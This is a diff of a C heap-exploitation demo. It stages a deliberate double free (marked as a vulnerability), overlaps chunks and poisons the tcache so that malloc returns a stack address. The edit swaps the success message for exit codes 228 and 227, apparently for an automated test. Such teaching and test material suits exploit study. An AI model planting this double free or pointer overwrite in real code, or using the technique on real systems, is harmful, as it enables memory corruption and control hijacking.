@@ -38,10 +38,10 @@ int main()
     intptr_t *prev = malloc(0x100);
     puts("Allocating the victim chunk.");
     intptr_t *a = malloc(0x100);
-    printf("malloc(0x100): a=%p.\n", a); 
+    printf("malloc(0x100): a=%p.\n", a);
     puts("Allocating a padding to prevent consolidation.\n");
     malloc(0x10);
-    
+
     // cause chunk overlapping
     puts("Now we are able to cause chunk overlapping");
     puts("Step 1: fill up tcache list");
@@ -50,37 +50,33 @@ int main()
     }
     puts("Step 2: free the victim chunk so it will be added to unsorted bin");
     free(a);
-    
+
     puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
     free(prev);
-    
+
     puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
     malloc(0x100);
     /*VULNERABILITY*/
     free(a);// a is already freed
     /*VULNERABILITY*/
-    
+
     // simple tcache poisoning
     puts("Launch tcache poisoning");
     puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
     intptr_t *b = malloc(0x120);
     puts("We simply overwrite victim's fwd pointer");
     b[0x120/8-2] = (long)stack_var;
-    
+
     // take target out
     puts("Now we can cash out the target chunk.");
     malloc(0x100);
     intptr_t *c = malloc(0x100);
     printf("The new chunk is at %p\n", c);
-    
-    // sanity check
-    assert(c==stack_var);
-    printf("Got control on target/stack!\n\n");
-    
-    // note
-    puts("Note:");
-    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
-    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");
 
-    return 0;
+    // sanity check
+    if (c==stack_var) {
+      exit(228);
+    } else {
+      exit(227);
+    }
 }
